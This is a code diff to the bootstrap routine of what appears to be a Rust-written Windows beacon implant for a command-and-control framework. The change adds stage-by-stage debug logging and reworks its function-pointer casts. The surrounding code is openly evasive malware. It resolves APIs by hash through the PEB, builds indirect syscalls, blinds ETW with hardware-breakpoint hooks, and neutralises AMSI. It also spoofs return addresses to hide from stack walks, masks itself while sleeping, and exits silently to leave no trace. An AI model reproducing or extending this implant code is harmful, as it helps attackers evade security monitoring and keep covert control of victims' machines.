@@ -151,23 +151,43 @@ pub unsafe fn instance() -> *mut Instance {
 /// Returns `None` when anything essential is missing — the caller must then
 /// exit silently (or spin if even the exit is unresolvable).
 unsafe fn bootstrap() -> Option<Instance> {
+    // The debug channel opens first, with nothing but the PEB: every stage
+    // below is traced, so a dead bootstrap leaves a trail naming the
+    // failing stage instead of a silent thread death.
+    let dbg = crate::runtime::debug::open_handle();
+    crate::runtime::debug::log_handle(dbg, b"bs: log open\n");
+
     let peb = get_peb();
     let ntdll = peb::find_module(peb, H_NTDLL);
     let kernel32 = peb::find_module(peb, H_KERNEL32);
     if ntdll.is_null() || kernel32.is_null() {
+        crate::runtime::debug::log_handle(dbg, b"bs: FAIL modules\n");
         return None;
     }
+    crate::runtime::debug::log_handle(dbg, b"bs: modules ok\n");
 
     // Silent exit first: everything else may fail and must still be able
     // to leave without a trace.
     let exit_thread_ptr = peb::find_export(ntdll, H_RTL_EXIT_USER_THREAD);
     if exit_thread_ptr.is_null() {
+        crate::runtime::debug::log_handle(dbg, b"bs: FAIL exit\n");
         return None;
     }
-    let exit_thread = *(exit_thread_ptr as *const unsafe extern "system" fn(u32));
+    let exit_thread = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(u32),
+    >(exit_thread_ptr as *const core::ffi::c_void);
+    crate::runtime::debug::log_handle(dbg, b"bs: exit ok\n");
 
     // Indirect syscall table (gadgets + NtDelayExecution SSN).
-    let syscall_table = syscalls::build(ntdll)?;
+    let syscall_table = match syscalls::build(ntdll) {
+        Some(t) => t,
+        None => {
+            crate::runtime::debug::log_handle(dbg, b"bs: FAIL syscalls\n");
+            return None;
+        }
+    };
+    crate::runtime::debug::log_handle(dbg, b"bs: syscalls ok\n");
 
     let get_time_ptr = peb::find_export(kernel32, H_GET_SYSTEM_TIME_AS_FILE_TIME);
     let qpc_ptr = peb::find_export(kernel32, H_QUERY_PERFORMANCE_COUNTER);
@@ -175,8 +195,10 @@ unsafe fn bootstrap() -> Option<Instance> {
     let heap_alloc = peb::find_export(kernel32, H_HEAP_ALLOC);
     let heap_free = peb::find_export(kernel32, H_HEAP_FREE);
     if get_time_ptr.is_null() || qpc_ptr.is_null() {
+        crate::runtime::debug::log_handle(dbg, b"bs: FAIL clock\n");
         return None;
     }
+    crate::runtime::debug::log_handle(dbg, b"bs: clock ok\n");
 
     // ETW blinding: resolve the hook targets and the VEH installer, then
     // install the handler and arm the debug registers. Any failure simply
@@ -186,17 +208,18 @@ unsafe fn bootstrap() -> Option<Instance> {
         && syscall_table.get_ctx_ssn != u32::MAX
         && syscall_table.set_ctx_ssn != u32::MAX
     {
-        let add_veh = *(add_veh
-            as *const unsafe extern "system" fn(
-                u32,
-                *mut core::ffi::c_void,
-            ) -> *mut core::ffi::c_void);
+        let add_veh = core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(u32, *mut core::ffi::c_void) -> *mut core::ffi::c_void,
+        >(add_veh as *const core::ffi::c_void);
         beacon_hwbp::install(&syscall_table, &etw_hooks, add_veh);
     }
+    crate::runtime::debug::log_handle(dbg, b"bs: etw ok\n");
 
     // Return-address spoofing gadget: mask the beacon's presence in API
     // stack walks. Unavailable gadget = direct calls (non-fatal).
     let retspoof_gadget = crate::runtime::retspoof::resolve_gadget(kernel32).unwrap_or(0);
+    crate::runtime::debug::log_handle(dbg, b"bs: gadget ok\n");
 
     // Encrypted sleep mask: static bounds resolved once; the per-cycle
     // fields (seed, gadget, interval) refresh every sleep. Discovery
@@ -206,20 +229,26 @@ unsafe fn bootstrap() -> Option<Instance> {
     if let Some(ref mut mask) = sleep_mask {
         mask.ssn = syscall_table.delay_ssn;
     }
+    crate::runtime::debug::log_handle(dbg, b"bs: sleepmask ok\n");
 
     // AMSI neutralization: hook now if amsi.dll is mapped, defer the rest
     // through loader notifications (Dr3 — the ETW hooks left it free).
     crate::runtime::amsi::install(peb, ntdll, &syscall_table, &mut etw_hooks);
+    crate::runtime::debug::log_handle(dbg, b"bs: amsi ok\n");
 
     // Seed the jitter RNG from the performance counter; a failed read falls
     // back to the remapped zero seed (never zero-stuck).
     let mut counter: i64 = 0;
-    let rng =
-        if (*(qpc_ptr as *const unsafe extern "system" fn(*mut i64) -> i32))(&mut counter) != 0 {
-            XorShift64::new(counter as u64)
-        } else {
-            XorShift64::new(0)
-        };
+    let rng = if (core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*mut i64) -> i32,
+    >(qpc_ptr as *const core::ffi::c_void))(&mut counter)
+        != 0
+    {
+        XorShift64::new(counter as u64)
+    } else {
+        XorShift64::new(0)
+    };
 
     // The heap is optional at this stage (first use is phase 3 file/wire
     // buffering): a missing Heap trio is not fatal.
@@ -227,11 +256,18 @@ unsafe fn bootstrap() -> Option<Instance> {
         None
     } else {
         Some(heap::Heap {
-            handle: (*(get_process_heap as *const GetProcessHeapFn))(),
-            alloc: *(heap_alloc as *const HeapAllocFn),
-            free: *(heap_free as *const HeapFreeFn),
+            handle: (core::mem::transmute::<*const core::ffi::c_void, GetProcessHeapFn>(
+                get_process_heap as *const core::ffi::c_void,
+            ))(),
+            alloc: core::mem::transmute::<*const core::ffi::c_void, HeapAllocFn>(
+                heap_alloc as *const core::ffi::c_void,
+            ),
+            free: core::mem::transmute::<*const core::ffi::c_void, HeapFreeFn>(
+                heap_free as *const core::ffi::c_void,
+            ),
         })
     };
+    crate::runtime::debug::log_handle(dbg, b"bs: heap ok\n");
 
     // Session identity (the beat's SessionKey field and the routing id):
     // generated per run, stable for the whole session.
@@ -250,7 +286,7 @@ unsafe fn bootstrap() -> Option<Instance> {
         .checked_div(config::SLEEP_MS)
         .unwrap_or(0);
 
-    let mut instance = Instance {
+    let instance = Instance {
         watermark: config::WATERMARK,
         ntdll,
         kernel32,
@@ -259,7 +295,10 @@ unsafe fn bootstrap() -> Option<Instance> {
         etw_hooks,
         retspoof_gadget,
         sleep_mask,
-        get_system_time_as_file_time: *(get_time_ptr as *const unsafe extern "system" fn(*mut u64)),
+        get_system_time_as_file_time: core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(*mut u64),
+        >(get_time_ptr as *const core::ffi::c_void),
         exit_thread,
         rng,
         winhttp: winhttp::resolve(peb, kernel32),
@@ -278,11 +317,9 @@ unsafe fn bootstrap() -> Option<Instance> {
         download: None,
         upload: None,
         bof_pending: None,
-        debug_handle: 0,
+        // The handle opened at the very top of the bootstrap carries over.
+        debug_handle: dbg,
     };
-    // Debug channel: open once, best effort (a failed open disables every
-    // log call silently — the beacon must never behave differently).
-    crate::runtime::debug::open(&mut instance);
     Some(instance)
 }
 
